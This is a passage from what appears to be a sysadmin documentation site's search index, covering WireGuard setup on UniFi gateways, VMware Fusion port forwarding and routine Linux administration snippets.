</li> </ol> <p>Now you should be able to create a wireguard interface. Please see usage below.</p>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#compatibility", "title": "Compatibility", "text": "<p>The wireguard module and tools included in this package have been tested on the following Ubiquiti devices:</p> <ul> <li>Unifi Dream Machine (UDM) and UDM-Pro 0.5.x, 1.9.x, 1.10.x, 1.11.x.</li> <li>UDM-SE and Unifi Dream Router (UDR) 2.2.x</li> <li>UniFi Next-Gen Gateway (UXG-Pro) 1.11.x</li> </ul> <p>Note that for the UDM, UDM Pro, and UXG-Pro, Ubiquiti includes the wireguard module in the official kernel since firmware 1.11.0-14, but doesn't include the WireGuard tools. The setup script in this package will try to load the built-in wireguard module if it exists first.</p>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#upgrade", "title": "Upgrade", "text": "<ol> <li> <p>Unload the wireguard module.</p> <pre><code>rmmod wireguard\n</code></pre> </li> <li> <p>Re-install wireguard by following the Installation instructions above to get the latest version.</p> </li> </ol>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#uninstallation", "title": "Uninstallation", "text": "<ol> <li> <p>Delete the wireguard files from your data directory.</p> <pre><code>rm -rf /mnt/data/wireguard\n</code></pre> </li> <li> <p>Delete the wireguard tools and any boot scripts.</p> <pre><code>rm /usr/bin/wg /usr/bin/wg-quick\n</code></pre> </li> </ol>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#usage", "title": "Usage", "text": "<p>Read the documentation on WireGuard.com for general WireGuard concepts. Here is a simple example of a wireguard server configuration for UnifiOS.</p> <ol> <li> <p>Create the server and client public/private key pairs by running the following. This will create the files <code>privatekey_server</code>, <code>publickey_server</code> and <code>privatekey_client1</code>, <code>publickey_client1</code>. These contain the public and private keys. Store these files somewhere safe. </p> <pre><code>wg genkey | tee privatekey_server | wg pubkey &gt; publickey_server\nwg genkey | tee privatekey_client1 | wg pubkey &gt; publickey_client1\n</code></pre> </li> <li> <p>On your UDM/UDR, create a wireguard config under <code>/etc/wireguard</code> named <code>wg0.conf</code>. Here is an example server config. Remember to use the correct server private key and the client public key.</p> <pre><code>[Interface]\nAddress = 10.0.2.1/24\nPrivateKey = &lt;server's privatekey&gt;\nListenPort = 51820\n\n[Peer]\nPublicKey = &lt;client's publickey&gt;\nAllowedIPs = 10.0.2.2/32\n</code></pre> </li> <li> <p>For your client, you will need a client config like the following example. Remember to use the correct client private key and the server public key.</p> </li> </ol> <pre><code>[Interface]\nAddress = 10.0.2.2/32\nPrivateKey = &lt;client's privatekey&gt;\n\n[Peer]\nPublicKey = &lt;server's publickey&gt;\nEndpoint = &lt;server's ip&gt;:51820\nAllowedIPs = 10.0.2.0/24\n</code></pre> <ul> <li>Adjust Address to change the IP of the client.</li> <li>Adjust AllowedIPs to set what your client should route through the tunnel. Set to <code>0.0.0.0/0,::/0</code> to route all the client's Internet through the tunnel. See the WireGuard documentation for more information.</li> <li>Note each different client requires their own private/public key pair, and the public key must be added to the server's WireGuard config as a separate Peer.</li> </ul> <ol> <li>To bring the tunnel up, run <code>wg-quick up &lt;config&gt;</code>. Verify the tunnel received a handshake by running <code>wg</code>.</li> </ol> <pre><code>wg-quick up /etc/wireguard/wg0.conf\n</code></pre> <ol> <li>To bring down the tunnel, run <code>wg-quick down &lt;config&gt;</code>.</li> </ol> <pre><code>wg-quick down /etc/wireguard/wg0.conf\n</code></pre> <ol> <li>In your UniFi Network settings, add a WAN_LOCAL (or Internet Local) firewall rule to ACCEPT traffic destined to UDP port 51820 (or your ListenPort if different). Opening this port in the firewall is needed so remote clients can access the WireGuard server.</li> </ol>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#routing", "title": "Routing", "text": "<p>The AllowedIPs parameter in the wireguard config allows you to specify which destination subnets to route through the tunnel.</p> <p>If you want to route router-connected clients through the wireguard tunnel based on source subnet or source VLAN, you need to set up policy-based routing. Currently, there is no GUI support for policy-based routing in UnifiOS, but it can be set up in SSH by using <code>ip route</code> to create a custom routing table, and <code>ip rule</code> to select which clients to route through the custom table. </p> <p>For a script that makes it easy to set-up policy-based routing rules on UnifiOS, see the split-vpn project.</p>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#binaries", "title": "Binaries", "text": "<p>Prebuilt binaries are available under releases.</p> <p>The binaries are statically linked against musl libc to mitigate potential issues with UnifiOS' glibc.</p>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#persistence-on-reboot", "title": "Persistence on Reboot", "text": "<p>The setup script must be run every time the system is rebooted to link the wireguard tools and load the module. This can be accomplished with a boot script.</p> <ul> <li> <p>For the UDM or UDM Pro, install UDM Utilities on-boot-script by following the instructions here, then create a boot script under <code>/mnt/data/on_boot.d/99-setup-wireguard.sh</code> and fill it with the following contents. Remember to run <code>chmod +x /mnt/data/on_boot.d/99-setup-wireguard.sh</code> afterwards.</p> <p> Click here to see the boot script. <pre><code>#!/bin/sh\n/mnt/data/wireguard/setup_wireguard.sh\n</code></pre> <li> <p>For the UDM-SE or UDR, create a systemd boot service to run the setup script at boot. Create a service file under <code>/etc/systemd/system/setup-wireguard.service</code> and fill it with the following contents. After creating the service, run <code>systemctl daemon-reload &amp;&amp; systemctl enable setup-wireguard</code> to enable the service on boot.      Click here to see the boot service. <pre><code>[Unit]\nDescription=Run wireguard setup script\nWants=network.target\nAfter=network.target\n\n[Service]\nType=oneshot\nExecStart=sh -c 'WGDIR=\"$(find /mnt/data/wireguard /data/wireguard -maxdepth 1 -type d -name \"wireguard\" 2&gt;/dev/null | head -n1)\"; \"$WGDIR/setup_wireguard.sh\"'\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <li> <p>Note this only adds the setup script to start at boot. If you also want to bring your wireguard interface up at boot, you will need to add another boot script with your <code>wg-quick up</code> command.</p> </li>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#troubleshooting", "title": "Troubleshooting", "text": "Setup script returns error \"Unsupported Kernel version XXX\"       * The wireguard package does not contain a wireguard module built for your firmware or kernel version, nor is there a built-in module in your kernel. Please open an issue and report your version so we can try to update the module.   wg-quick up returns error \"unable to initialize table 'raw'\"    * Your kernel does not have the iptables raw module. The raw module is only required if you use `0.0.0.0/0` or `::/0` in your wireguard config's AllowedIPs. A workaround is to instead set AllowedIPs to `0.0.0.0/1,128.0.0.0/1` for IPv4 or `::/1,8000::/1` for IPv6. These subnets cover the same range but do not invoke wg-quick's use of the iptables raw module.", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#credits", "title": "Credits", "text": "<p>Original work to compile WireGuard on UnifiOS by @tusc (wireguard-kmod).</p> <p>\"WireGuard\" and the \"WireGuard\" logo are registered trademarks of Jason A. Donenfeld.</p>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#the-built-in-gateway-dns-does-not-reply-to-requests-from-the-wireguard-tunnel", "title": "The built-in gateway DNS does not reply to requests from the WireGuard tunnel", "text": "<ul> <li>The built-in dnsmasq on UnifiOS is configured to only listen for requests from specific interfaces. The wireguard interface name (e.g.: wg0) needs to be added to the dnsmasq config so it can respond to requests from the tunnel. You can run the following to add wg0 to the dnsmasq interface list:</li> </ul> <pre><code>echo \"interface=wg0\" &gt; /run/dnsmasq.conf.d/custom_listen.conf\nkillall -9 dnsmasq\n</code></pre> <ul> <li>You can also those commands to PostUp in your wireguard config's Interface section to automatically run them when the tunnel comes up, e.g.:</li> </ul> <pre><code> PostUp = echo \"interface=%i\" &gt; /run/dnsmasq.conf.d/custom_listen.conf; killall -9 dnsmasq\n PreDown = rm -f /run/dnsmasq.conf.d/custom_listen.conf; killall -9 dnsmasq\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/vmware/vmware-fusion/", "title": "VMware Fusion", "text": "", "tags": ["vmware", "vmware-fusion"]}, {"location": "infrastructure/vmware/vmware-fusion/#port-forwarding-for-reverse-shells", "title": "Port Forwarding for Reverse Shells", "text": "<p>If you use your vm as NAT network \"Shared with My Mac\" You can forward a port to your host macOS machine.</p> <p>The network configuration files are stored their respective folders within the VMware Fusion preferences folder.</p> <pre><code>/Library/Preferences/VMware\\ Fusion/\n</code></pre> <p>In order to find the right network config you can inspect the dhcpd.conf inside of vmnet* folders.</p> <pre><code>cat dhcpd.conf\n</code></pre> <p>After you found the correct network it should contain a nat.conf file Edit the (with sudo privileges) nat.conf, For UDP protocol edit the section [incomingudp] for TCP protocol edit the [incomingtcp]</p> <p>In the next example we will forward port 4444 from VM to the 4444 port on the host. You can foreword any port to any port as you like.</p> <p>After you saved the configuration nat.conf file you must restart VMware's network services</p> <p>You do NOT need to restart the Virtual Machine</p> <pre><code>sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-cli --stop\nsudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-cli --start\n</code></pre> <p>If you want to test the port forwarding is working as it should here's an example of running simple python webserver on the vm on port 4444 we configured before:</p> <pre><code>python -m SimpleHTTPServer 4444\n</code></pre> <p>Now you can test it on the Host machine by browsing to <code>http://localhost:4444</code> or <code>http://127.0.0.1:4444</code></p>", "tags": ["vmware", "vmware-fusion"]}, {"location": "linux/files-handling/", "title": "Files Handling", "text": "", "tags": ["linux", "files-handling"]}, {"location": "linux/files-handling/#ncurses-disk-usage", "title": "NCurses Disk Usage", "text": "<p>Ncdu is a disk usage analyzer with an ncurses interface.</p> <pre><code>apt-get install ncdu\n</code></pre>", "tags": ["linux", "files-handling"]}, {"location": "linux/files-handling/#delete-large-file-list-argument-list-too-long", "title": "Delete Large File List - Argument list too long", "text": "<pre><code>find . -name '*'|xargs rm\n</code></pre>", "tags": ["linux", "files-handling"]}, {"location": "linux/files-handling/#change-permissions-chmod-to-folders-and-files", "title": "Change permissions (chmod) to folders and files", "text": "<pre><code>find . -type d -exec chmod 755 {} +\nfind . -type f -exec chmod 644 {} +\n</code></pre>", "tags": ["linux", "files-handling"]}, {"location": "linux/files-handling/#recursively-chown-user-and-group", "title": "Recursively chown user and group", "text": "<pre><code>chown -R user:group /some/path/here\n</code></pre>", "tags": ["linux", "files-handling"]}, {"location": "linux/files-handling/#recursively-chmod-to-775664", "title": "Recursively chmod to 775/664", "text": "<pre><code>chmod -R a=,a+rX,u+w,g+w /some/path/here\n</code></pre> <pre><code>          ^  ^    ^   ^ adds write to group\n          |  |    | adds write to user\n          |  | adds read to all and execute to all folders (which controls access)\n          | sets all to `000`\n</code></pre>", "tags": ["linux", "files-handling"]}, {"location": "linux/files-handling/#find-uidgid-for-user", "title": "Find UID/GID for user", "text": "<pre><code>id &lt;username&gt;\n</code></pre>", "tags": ["linux", "files-handling"]}, {"location": "linux/general-snippets/", "title": "General Snippets", "text": "", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#disable-ssh-login-welcome-message", "title": "Disable SSH Login Welcome Message", "text": "<p>To disable</p> <pre><code>touch ~/.hushlogin\n</code></pre> <p>To re-enable</p> <pre><code>rm -rf ~/.hushlogin\n</code></pre>", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#change-sudo-password-requirement-timeout-in-linux", "title": "Change Sudo Password Requirement Timeout In Linux", "text": "<p>To change sudo password timeout limit in Linux, run:</p> <pre><code>sudo visudo\n</code></pre> <p>This command will open the\u00a0/etc/sudoers\u00a0file in\u00a0nano\u00a0editor.</p> <p>Find the following line:</p> <pre><code>Defaults env_reset\n</code></pre> <p>Change it like below the 30 is the number of minutes you want to set the timeout to.</p> <pre><code>Defaults env_reset, timestamp_timeout=30\n</code></pre>", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#redirect-output-to-a-file-and-stdout-with-tee", "title": "Redirect Output to a File and Stdout With tee", "text": "<p>The command you want is named <code>tee</code>:</p> <pre><code>foo | tee output.file\n</code></pre> <p>For example, if you only care about stdout:</p> <pre><code>ls -a | tee output.file\n</code></pre> <p>If you want to include stderr, do:</p> <pre><code>program [arguments...] 2&gt;&amp;1 | tee outfile\n</code></pre> <p>2&gt;&amp;1 redirects channel 2 (stderr/standard error) into channel 1 (stdout/standard output), such that both is written as stdout. It is also directed to the given output file as of the tee command.</p> <p>Furthermore, if you want to append to the log file, use tee -a as:</p> <pre><code>program [arguments...] 2&gt;&amp;1 | tee -a outfile\n</code></pre>", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#add-permanent-path-to-application", "title": "Add Permanent Path to Application", "text": "<p>First find the location of the Application/Service:</p> <pre><code>find / -name ApplicationName\n</code></pre> <p>Go to the path where the application is located</p> <pre><code>cd \"../../../ApplicationName\"\n</code></pre> <p>Run this command for ZSH:</p> <pre><code>echo 'export PATH=\"'$(pwd)':$PATH\"' &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc\n</code></pre> <p>Run this command for \"shell Profile\":</p> <pre><code>echo 'export PATH=\"'$(pwd)':$PATH\"' &gt;&gt; ~/.profile &amp;&amp; source ~/.profile\n</code></pre> <p>Run this command for \"shell\":</p> <pre><code>echo 'export PATH=\"'$(pwd)':$PATH\"' &gt;&gt; ~/.shellrc &amp;&amp; source ~/.shellrc\n</code></pre>", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#create-symbolic-links", "title": "Create Symbolic Links", "text": "<p>To create a symbolic link in Unix/Linux, at the terminal prompt, enter:</p> <pre><code>ln -s source_file target_file\n</code></pre> <p>to remove symbolic link use the <code>rm</code> command on the link</p>", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#open-last-edited-file", "title": "Open Last Edited File", "text": "<pre><code>less `ls -dx1tr /usr/local/cpanel/logs/cpbackup/*|tail -1`\n</code></pre>", "tags": ["linux", "snippets"]}, {"location": "linux/general-snippets/#kill-process-that-runs-more-than-x-time", "title": "Kill Process That Runs More Than X Time", "text": "<p>Kill cgi after 30 secs:</p> <pre><code>for i in `ps -eo pid,etime,cmd|grep cgi|awk '$2 &gt; \"00:30\" {print $1}'`; do kill $i; done\n</code></pre>", "tags": ["linux", "snippets"]}, {"location": "linux/locales-time-zone/", "title": "Locales &amp; Timezone", "text": "", "tags": ["linux", "locales", "timezone"]}, {"location": "linux/locales-time-zone/#fix-locales-fix-bash-local-error", "title": "Fix Locales (Fix Bash Local Error)", "text": "<p>Set the Locale, Find the en_US.UTF-8 in the list and select it, at the following screen select it.</p> <pre><code>dpkg-reconfigure locales\n</code></pre>", "tags": ["linux", "locales", "timezone"]}, {"location": "linux/locales-time-zone/#set-system-time-with-time-zone-timedatectl-ntp", "title": "Set System Time With Time Zone (timedatectl ntp)", "text": "<p>Find your time zone with timedatectl list-timezones use grep for easier results:</p> <pre><code>timedatectl list-timezones | grep \"Toronto\"\n</code></pre> <p>The output should look like this:</p> <pre><code>America/Toronto\n</code></pre> <p>Now set the Time Zone and active it.</p> <pre><code>timedatectl set-timezone Asia/Jerusalem\ntimedatectl set-ntp true\n</code></pre> <p>Now test timedatectl status</p> <pre><code>timedatectl status\n</code></pre> <p>Check your system time</p> <pre><code>date\n</code></pre>", "tags": ["linux", "locales", "timezone"]}, {"location": "linux/lvm-partitions/", "title": "LVM Partitions", "text": "", "tags": ["linux", "lvm"]}, {"location": "linux/lvm-partitions/#removing-lvm-partition-and-merging-in-to-root-partition", "title": "Removing LVM Partition and Merging In To / (root partition)", "text": "<p>Find out the names of the partition with df</p> <pre><code>df\n</code></pre> <p>You need to unmount the partition before you can delete them and marge backup the data of the partition you would like to delete this example will use \"centos-home\" as the partition that will be merged to the root partition.</p> <pre><code>unmount -a\nlvremove /dev/mapper/centos-home\nlvextend -l +100%FREE -r /dev/mapper/centos-root\n</code></pre> <p>After the merging and before mounting you should remove the partition from fastab</p> <pre><code>nano /etc/fstab\nmount -a\n</code></pre>", "tags": ["linux", "lvm"]}, {"location": "linux/memory-swap/", "title": "Memory &amp; Swap", "text": "", "tags": ["linux"]}, {"location": "linux/memory-swap/#who-uses-ram", "title": "Who Uses RAM", "text": "<pre><code>ps aux  | awk '{print $6/1024 \" MB\\t\\t\" $11}'  | sort -n\n</code></pre>", "tags": ["linux"]}, {"location": "linux/memory-swap/#who-is-using-swap-memory", "title": "Who Is Using Swap Memory", "text": "<pre><code>grep VmSwap /proc/*/status 2&gt;/dev/null | sort -nk2 | tail -n5\n</code></pre>", "tags": ["linux"]}, {"location": "linux/memory-swap/#clear-cache-and-swap", "title": "Clear Cache and Swap", "text": "<pre><code>echo 3 &gt; /proc/sys/vm/drop_caches &amp;&amp; swapoff -a &amp;&amp; swapon -a\n</code></pre>", "tags": ["linux"]}, {"location": "linux/services-and-daemons/", "title": "Services &amp; Daemons", "text": "<p>In Linux, a service is a program that runs in the background and performs a specific function. A daemon is a type of service that also runs in the background and often starts at boot time. These processes can be controlled using the systemctl or service command. Services and daemons are an important part of the Linux operating system, as they provide various functions and services that allow the system to run smoothly. There are many different types of services and daemons that can be found on a typical Linux system, and you can find more information about them in the documentation for your specific distribution.</p>"}, {"location": "linux/services-and-daemons/#useful-systemctl-commands", "title": "Useful <code>systemctl</code> commands", "text": "<p>Start the specified service.</p> <pre><code>systemctl start &lt;service&gt;\n</code></pre> <p>Stop the specified service.</p> <pre><code>systemctl stop &lt;service&gt;\n</code></pre> <p>Restart the specified service.</p> <pre><code>systemctl restart &lt;service&gt;\n</code></pre> <p>Enable the specified service to start automatically at boot time.</p> <pre><code>systemctl enable &lt;service&gt;\n</code></pre> <p>Disable the specified service from starting automatically at boot time.</p> <pre><code>systemctl disable &lt;service&gt;\n</code></pre> <p>Show the current status and runtime information for the specified service.</p> <pre><code>systemctl status &lt;service&gt;\n</code></pre> <p>Show the dependencies for the specified service.</p> <pre><code>systemctl list-dependencies &lt;service&gt;\n</code></pre> <p>List all installed unit files on the system.</p> <pre><code>systemctl list-units --all\n</code></pre>"}, {"location": "linux/services-and-daemons/#display-running-services", "title": "Display Running Services", "text": "<p>The systemctl command with the grep command will display a list of all running services and daemons on your Linux system. The grep command will search the output of systemctl for the string \"running\" and only display the lines that contain that string.</p> <pre><code>systemctl | grep running\n</code></pre> <p>For more readable output:</p> <pre><code>systemctl --no-pager | grep running | column -t\n</code></pre>"}, {"location": "linux/services-and-daemons/#display-enabled-services", "title": "Display Enabled Services", "text": "<p><code>systemctl list-unit-files --state=enabled</code> is a command that shows a list of unit files that are currently enabled on the system. The --state option specifies the state of the unit files that you want to see. By using --state=enabled, you will see only unit files that are enabled and will be started automatically when the system boots.</p> <pre><code>systemctl list-unit-files --state=enabled\n</code></pre>"}, {"location": "linux/smb-mount-autofs/", "title": "SMB Mount With autofs", "text": "<p>Install autofs cifs-utils</p> <pre><code>apt install -y autofs cifs-utils\n</code></pre> <p>Eddit auto.cifs file</p> <pre><code>nano /etc/auto.cifs\n</code></pre> <p>Add this to the file: (\"media\" - is any name for your mount)</p> <pre><code>media    -fstype=cifs,rw,noperm,vers=3.0,credentials=/etc/.credentials.txt    ://oscar.3os.re/active-share/media\n</code></pre> <p>Create credentials file</p> <pre><code>nano /etc/.credentials.txt\n</code></pre> <p>Add you credentials for the smb mount:</p> <pre><code>username=YourUser\npassword=YourPassword\n</code></pre> <p>Exit and save:</p> <pre><code>nano /etc/auto.master\n</code></pre> <p>At the end of the file add: (\"/mnt\" - mount location, /etc/auto.cifs your config for mounting the SMB Share)</p> <pre><code>/mnt    /etc/auto.cifs --timeout=600 --ghost\n</code></pre> <p>Save end exit. Test the mounting.</p> <pre><code>systemctl start autofs\ncd /mnt/media/\nls\n</code></pre> <p>You should see the mount over there. Enable autofs on boot:</p> <pre><code>systemctl enable autofs\n</code></pre>", "tags": ["smb", "share", "autofs", "mount"]}, {"location": "linux/smb-mount-autofs/#smb-mount-on-linux-with-credentials", "title": "SMB Mount on Linux With Credentials", "text": "<pre><code>sudo apt-get install cifs-utils\nnano ~/.smbcredentials\n</code></pre> <p>add this to the config.</p> <pre><code>username=msusername\npassword=mspassword\n</code></pre> <p>Save the file, exit the editor. Change the permissions of the file to prevent unwanted access to your credentials:</p> <pre><code>chmod 600 ~/.smbcredentials\n</code></pre> <p>Then edit your /etc/fstab file (with root privileges) to add this line (replacing the insecure line in the example above, if you added it):</p> <pre><code>//servername/sharename /media/windowsshare cifs vers=1.0,credentials=/home/ubuntuusername/.smbcredentials,iocharset=utf8,sec=ntlm 0 0\n</code></pre> <p>Save the file, exit the editor.</p> <p>Finally, test the fstab entry by issuing:</p> <pre><code>sudo mount -a\n</code></pre> <p>If there are no errors, you should test how it works after a reboot. Your remote share should mount automatically.</p>", "tags": ["smb", "share", "autofs", "mount"]}, {"location": "linux/ssh-hardening-with-rsa-keys/", "title": "SSH Hardening with SSH Keys", "text": "", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/ssh-hardening-with-rsa-keys/#generating-a-new-ssh-key", "title": "Generating a new SSH key", "text": "<p>RSA 4096</p> <pre><code>ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n</code></pre> <p>Ed25519 Algorithm</p> <pre><code>ssh-keygen -t ed25519 -C \"your_email@example.com\"\n</code></pre>", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/ssh-hardening-with-rsa-keys/#automatic-copy-rsa-key-to-the-server", "title": "Automatic Copy RSA Key to The Server", "text": "<pre><code>ssh-copy-id -i ~/.ssh/id_rsa.pub user@host\n</code></pre>", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/ssh-hardening-with-rsa-keys/#manually-copy-rsa-key-to-the-server", "title": "Manually Copy RSA Key to The Server", "text": "<p>ssh to the host (<code>do not close this connection</code>)</p> <pre><code>mkdir -p ~/.ssh &amp;&amp; touch .ssh/authorized_keys\n</code></pre> <p>copy your public key usually located at <code>~/.ssh/id_rsa.pub</code></p> <pre><code>echo PUCLICK_Key_STRING &gt;&gt; ~/.ssh/authorized_keys\n</code></pre>", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/ssh-hardening-with-rsa-keys/#ssh-hardening-disable-password-login", "title": "SSH Hardening - Disable Password Login", "text": "<p>edit <code>/etc/ssh/sshd_config</code> change:</p> <pre><code>#PasswordAuthentication yes\n</code></pre> <p>to</p> <pre><code>PasswordAuthentication no\n</code></pre> <p>save&amp;exit</p> <p>restart ssh service:</p> <pre><code>sudo systemctl restart ssh\n</code></pre> <p>Danger</p> <p>Open new SSH season and test login with RSA Keys before closing the existing connection</p>", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/ssh-hardening-with-rsa-keys/#optional-change-ssh-port", "title": "Optional: change ssh port", "text": "<p>edit <code>/etc/ssh/sshd_config</code> change the port to a desired one</p> <pre><code>port 1337\n</code></pre> <p>save&amp;exit</p> <p>restart ssh service:</p> <pre><code>sudo systemctl restart ssh\n</code></pre>", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/ssh-hardening-with-rsa-keys/#add-privet-id_rsa-key-to-server", "title": "Add Privet id_rsa key to Server", "text": "<p>copy the id_rsa key to ~/.ssh folder</p> <pre><code>cd ~/.ssh\nsudo ssh-agent bash\nssh-add id_rsa\n</code></pre>", "tags": ["linux", "ssh", "rsa"]}, {"location": "linux/Network/identify-nics/", "title": "Identify Physical Network Interfaces", "text": "", "tags": ["linux", "network"]}, {"location": "linux/Network/identify-nics/#the-problem", "title": "The Problem", "text": "<p>Servers usually have a number of physical network interfaces. The network interfaces names in linux host usually won't tell you much about the which physical network interface corresponds to the interface name. Therefor, it creates a problem when you want to use a specific network interface for a specific purpose but you don't know which physical network interface corresponds to the interface name.</p>", "tags": ["linux", "network"]}, {"location": "linux/Network/identify-nics/#the-solution", "title": "The Solution", "text": "<p><code>ethtool</code> tool can be used to identify the physical network interface corresponding to a network interface name.</p> <p>For this method to work, you need a <code>physical access</code>to host's network cards and the physical network interfaces should have <code>Led indicator</code> lights.</p> <p>Note</p> <p>This functionality of ethtool may not be supported by all server or network card hardware.</p> <p><code>ethtool</code> usually isn't installed by default on a linux host. You can install it by running the following command (debian example):</p> <pre><code>apt install ethtool\n</code></pre> <p>Find the network interfaces present on the host and run the following command for each network interface:</p> <pre><code>ip addr\n</code></pre> <p>or</p> <pre><code>ifconfig -a\n</code></pre> <p>Now you can use the <code>ethtool</code> command to identify the physical network interface corresponding to the network interface name.</p> <p>Example for <code>eth0</code> network interface name:</p> <pre><code>ethtool --identify eth0\n</code></pre> <p>This command will run untill you stop it. When it's running, you should see the LED indicator <code>light blinking</code> (usually orange) on the physical network interface corresponding to the network interface name.</p> <p>To get information about the hardware capabilities of the network interface:</p> <pre><code>ethtool eth0\n</code></pre> <p>output example:</p> <pre><code>ethtool enp12s0f4\n\nSettings for enp12s0f4:\n    Supported ports: [ FIBRE ]\n    Supported link modes:   1000baseT/Full\n                            10000baseT/Full\n    Supported pause frame use: Symmetric Receive-only\n    Supports auto-negotiation: No\n    Supported FEC modes: None\n    Advertised link modes:  10000baseT/Full\n    Advertised pause frame use: Symmetric\n    Advertised auto-negotiation: No\n    Advertised FEC modes: None\n    Link partner advertised link modes:  Not reported\n    Link partner advertised pause frame use: Symmetric\n    Link partner advertised auto-negotiation: No\n    Link partner advertised FEC modes: None\n    Speed: 10000Mb/s\n    Duplex: Full\n    Auto-negotiation: off\n    Port: Direct Attach Copper\n    PHYAD: 255\n    Transceiver: internal\n        Current message level: 0x000000ff (255)\n                               drv probe link timer ifdown ifup rx_err tx_err\n    Link detected: yes\n</code></pre>", "tags": ["linux", "network"]}, {"location": "linux/ubuntu-debian/disable-ipv6/", "title": "Disable IPv6 on Ubuntu and Debian Linux Permanently", "text": "<p>By default, Ubuntu/Debian IPv6 is enabled after installation. This means that the IPv6 stack is active and the host can communicate with other hosts on the same network via IPv6 protocol.</p> <p>You can disable Ubuntu/Debian by editing the <code>/etc/default/grub</code> file.</p> <pre><code>nano /etc/default/grub\n</code></pre> <p>add <code>ipv6.disable=1</code> to the end of <code>GRUB_CMDLINE_LINUX_DEFAULT</code> and <code>GRUB_CMDLINE_LINUX</code> line. Don't change the other values at those lines.</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"ipv6.disable=1\"\nGRUB_CMDLINE_LINUX=\"ipv6.disable=1\"\n</code></pre> <p>The config should look like this:</p> <p></p> <p>Update the grub configuration.</p> <pre><code>update-grub\n</code></pre> <p>Save and exit. <code>Reboot</code> to apply the changes.</p>", "tags": ["ubuntu", "debian", "ipv6"]}, {"location": "linux/ubuntu-debian/free-port-53/", "title": "Free Port 53 on Ubuntu", "text": "", "tags": ["Ubuntu", "dns"]}, {"location": "linux/ubuntu-debian/free-port-53/#whats-using-port-53", "title": "What's Using Port 53?", "text": "<p>When you install Ubuntu (in my case its Server version). It uses systemd-resolved as internal DNS Forwarder.</p> <p>systemd-resolved is a system service that provides network name resolution to local applications. It implements a caching and validating DNS/DNSSEC stub resolver, as well as an LLMNR resolver and responder.</p> <p></p>", "tags": ["Ubuntu", "dns"]}, {"location": "linux/ubuntu-debian/free-port-53/#how-to-free-port-53-on-ubuntu", "title": "How to Free Port 53 on Ubuntu", "text": "<p>If we want to use port 53 for other purposes, we need to free it for example a <code>Pihole DNS</code> server.</p> <p>We can do it with the following commands:</p> <pre><code>sudo sed -r -i.orig 's/#?DNSStubListener=yes/DNSStubListener=no/g' /etc/systemd/resolved.conf\nsudo sh -c 'rm /etc/resolv.conf &amp;&amp; ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf'\nsudo systemctl restart systemd-resolved\n</code></pre>", "tags": ["Ubuntu", "dns"]}, {"location": "linux/ubuntu-debian/remove-snap-store/", "title": "Remove Snap Store from Ubuntu", "text": "", "tags": ["ubuntu"]}, {"location": "linux/ubuntu-debian/remove-snap-store/#what-is-snap", "title": "What Is Snap?", "text": "<p>Snap is a cross-platform packaging and deployment system developed by Canonical, the makers of Ubuntu, for the Linux platform. It's compatible with most major Linux distros, including Ubuntu, Debian, Arch Linux, Fedora, CentOS, and Manjaro.</p>", "tags": ["ubuntu"]}, {"location": "linux/ubuntu-debian/remove-snap-store/#how-to-remove-snap-store", "title": "How To Remove Snap Store", "text": "<pre><code>sudo rm -rf /var/cache/snapd/\nsudo apt autoremove --purge snapd gnome-software-plugin-snap\nsudo rm -rf ~/snap\n</code></pre>", "tags": ["ubuntu"]}, {"location": "linux/ubuntu-debian/unattended-upgrades/", "title": "Unattended Upgrades", "text": "<pre><code>sudo apt install -y unattended-upgrades apt-listchanges\n</code></pre> <p>Edit the config to your preference</p> <pre><code>sudo nano /etc/apt/apt.conf.d/50unattended-upgrades\n</code></pre> <p>Example</p> UbuntuDebian/RaspberyOS <pre><code>Unattended-Upgrade::Allowed-Origins {\n\"${distro_id}:${distro_codename}\";\n\"${distro_id}:${distro_codename}-security\";\n// Extended Security Maintenance; doesn't necessarily exist for\n// every release and this system may not have it installed, but if\n// available, the policy for updates is such that unattended-upgrades\n// should also install from here by default.\n\"${distro_id}ESMApps:${distro_codename}-apps-security\";\n\"${distro_id}ESM:${distro_codename}-infra-security\";\n\"${distro_id}:${distro_codename}-updates\";\n\"${distro_id}:${distro_codename}-proposed\";\n// \"${distro_id}:${distro_codename}-backports\";\n};\n\nUnattended-Upgrade::DevRelease 